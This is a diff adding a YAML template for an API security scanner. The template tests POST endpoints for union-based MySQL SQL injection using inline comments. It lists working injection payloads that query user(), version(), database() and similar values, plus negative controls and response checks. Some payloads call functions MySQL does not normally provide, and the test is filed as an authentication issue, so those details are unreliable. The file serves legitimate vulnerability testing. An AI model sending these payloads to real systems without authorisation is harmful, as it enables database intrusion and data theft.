@@ -1,0 +1,197 @@
+id: UNION_INLINE_COMMENT_BASED_MYSQLI_POST
+info:
+  name: "Union based SQL Injection test with Inline Comments for MySQL on POST method APIs"
+  description: "Union based SQL Injection test with Inline Comments for MySQL on POST method APIs checks for vulnerabilities in a web application's ability to properly handle user inputs. This test specifically targets scenarios where attackers attempt to manipulate SQL queries by injecting inline comments (`--` or `#`) into the payload. These comments can be used to alter the execution of the SQL query, bypassing security measures like input validation or sanitization. The goal is to determine if the API is vulnerable to SQL injection that can disrupt database queries or retrieve sensitive information."
+  details: "Union based SQL Injection test with Inline Comments for MySQL on POST method APIs involves crafting SQL injection payloads that include inline comments, typically `--` or `#`, to manipulate the query syntax. These comments are used to terminate or ignore parts of the SQL query, potentially exposing or altering data that shouldn't be accessible. This test ensures that the API does not improperly handle SQL inputs, which could allow attackers to bypass security controls and retrieve sensitive data or cause unintended behavior. The goal is to identify whether the server can correctly filter or handle such malicious inputs."
+  impact: "The impact of a Union based SQL Injection test with Inline Comments for MySQL on POST method APIs could be severe if vulnerabilities are present. Attackers may exploit the flaw to bypass authentication, access unauthorized data, or modify database records. Sensitive information, such as user credentials or financial data, could be exposed or manipulated. This could lead to significant data breaches, compromise of application integrity, and potential legal or regulatory repercussions for the affected organization."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_INLINE_COMMENT_BASED_MYSQLI_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    eq: "POST"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "' UNION/**/SELECT/**/1, user(), version()--"
+    - "' UNION/**/SELECT/**/1, database(), version()--"
+    - "' UNION/**/SELECT/**/1, current_user(), version()--"
+    - "' UNION/**/SELECT/**/1, user(), schema()--"
+    - "' UNION/**/SELECT/**/1, user(), hostname()--"
+    - "' UNION/**/SELECT/**/1, user(), datadir()--"
+    - "' UNION/**/SELECT/**/1, user(), session_user()--"
+    - "' UNION/**/SELECT/**/1, user(), now()--"
+    - "' UNION/**/SELECT/**/1, user(), tmpdir()--"
+    - "' UNION/**/SELECT/**/1, user(), version_comment()--"
+  unionBasedNegativePayloads:
+    - "' UNION/**/SELECT/**/1, user(), version() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, database(), version() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, current_user(), version() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), schema() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), hostname() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), datadir() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), session_user() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), now() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), tmpdir() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), version_comment() WHERE 1=0--"
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionBasedPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - UNION
+                - SELECT
+                - </html>
+                - <html>
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionBasedNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - UNION
+                - SELECT
+                - " WHERE "
+                - <html>
+                - </html>
+              neq: "${x1.response.body}"
+        - success: vulnerable
+
